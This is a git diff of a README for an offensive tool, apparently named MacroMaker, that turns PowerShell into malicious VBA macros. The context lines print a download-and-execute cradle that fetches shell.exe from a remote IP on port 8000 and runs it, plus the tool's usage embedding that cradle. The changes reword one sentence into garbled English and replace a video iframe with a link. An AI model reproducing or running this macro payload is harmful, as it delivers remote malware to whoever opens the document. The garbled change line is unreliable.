@@ -39,7 +39,7 @@
  ```
  (New-Object Net.WebClient).DownloadFile('http://10.195.100.221:8000/shell.exe',' C:\Users\Public\Documents\shell.exe');Start-Process (' C:\Users\Public\Documents\shell.exe')
  ```
-- this code will download file from the server then will excxut it after download to use as VBA use Macromacker
+- this code will download file from the server then will excxut it transfer download to use as VBA use Macromacker
 - ./Macromaker.py <-c the poweshell code > <-n the file name to  save output > 
 - ./MacroMaker.py -c "(New-Object Net.WebClient).DownloadFile('http://10.195.100.221:8000/shell.exe',' C:\Users\Public\Documents\shell.exe');Start-Process (' C:\Users\Public\Documents\shell.exe')" -n code
 ```
@@ -113,9 +113,6 @@ End Sub
 -----------------------------------------------------------------
 ### video tutorial
 --------------------
-<p alian="center">	
-<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/B_i066ZqvPc" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-</p>
-	
+* [video tutorial](https://www.youtube.com/watch?v=B_i066ZqvPc)
 - rootx1982@gmail.com
 -  thank you 
